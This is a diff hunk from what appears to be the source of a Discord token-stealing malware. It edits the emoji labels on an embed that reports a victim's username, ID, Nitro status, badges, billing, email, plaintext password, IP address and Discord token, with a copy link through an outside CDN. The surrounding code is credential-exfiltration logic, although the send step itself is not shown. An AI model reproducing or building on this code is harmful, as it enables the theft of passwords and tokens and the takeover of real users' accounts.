@@ -610,47 +610,47 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:944007295417843743:959785231982931979> username:',
+            name: '<a:b_800577490027413556:990325166397603921> username:',
             value: `\`${json.username}#${json.discriminator}\``,
             inline: false,
           },
           {
-            name: '<a:944007295417843743:959785231982931979> id:',
+            name: '<a:b_800577490027413556:990325166397603921> id:',
             value: `\`${json.id}\``,
             inline: false,
           },
           {
-            name: '<a:satanist:802503618972483615> nitro:',
+            name: '<a:b_800577490027413556:990325166397603921> nitro:',
             value: `\`${nitro}\``,
             inline: !1,
           },
           {
-            name: '<a:satanist:802503618972483615> Badges:',
+            name: '<a:b_800577490027413556:990325166397603921> Badges:',
             value: `${badges}`,
             inline: !1,
           },    
           {
-            name: '<:944007233820307467:959785232037470208> Billing:',
+            name: '<a:b_800577490027413556:990325166397603921> Billing:',
             value: `**${billing}**`,
             inline: !1,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Email:',
+            name: '<a:b_800577490027413556:990325166397603921> Email:',
             value: `\`${email}\``,
             inline: false,
           },
           {
-            name: '<a:satan:846706207632261120> Password:',
+            name: '<a:b_800577490027413556:990325166397603921> Password:',
             value: `\`${password}\``,
             inline: false,
           },
           {
-            name: '<:944007233820307467:959785232037470208> IP:',
+            name: '<a:b_800577490027413556:990325166397603921> IP:',
             value: `\`${config.ip}\``,
             inline: false,
           },
           {
-            name: '<a:944007295417843743:959785231982931979> Token:',
+            name: '<a:b_800577490027413556:990325166397603921> Token:',
             value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/${token})`,
             inline: !1,
           },
